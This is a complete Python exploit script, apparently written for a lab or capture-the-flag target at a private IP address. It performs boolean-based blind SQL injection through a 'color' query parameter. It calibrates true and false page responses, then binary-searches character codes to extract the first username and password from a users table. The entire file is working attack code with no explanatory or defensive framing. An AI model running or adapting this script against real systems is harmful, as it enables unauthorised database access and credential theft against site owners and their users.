#!/usr/bin/env python3
import sys
import urllib.parse
import urllib.request

BASE_URL = "http://10.0.0.40:1336/"


def fetch(payload):
    query = urllib.parse.urlencode({
        "id": "0",
        "stock": "0",
        "color": payload,
    })
    with urllib.request.urlopen(f"{BASE_URL}?{query}", timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


def calibrate():
    true_body = fetch("' OR 1=1 -- -")
    false_body = fetch("' OR 1=2 -- -")
    if true_body == false_body:
        raise RuntimeError("Cannot distinguish true and false SQLi responses")
    return true_body


def is_true(condition, true_marker):
    body = fetch(f"' OR ({condition}) -- -")
    return body == true_marker


def extract(max_len=120):
    true_marker = calibrate()
    expression = "(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1)"
    result = []

    for pos in range(1, max_len + 1):
        if is_true(f"ASCII(SUBSTRING({expression},{pos},1))=0", true_marker):
            break

        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if is_true(f"ASCII(SUBSTRING({expression},{pos},1))>{mid}", true_marker):
                low = mid + 1
            else:
                high = mid - 1

        result.append(chr(low))
        print("".join(result), flush=True)

    return "".join(result)


if __name__ == "__main__":
    try:
        print(extract())
    except Exception as exc:
        print(f"Extraction failed: {exc}", file=sys.stderr)
        sys.exit(1)
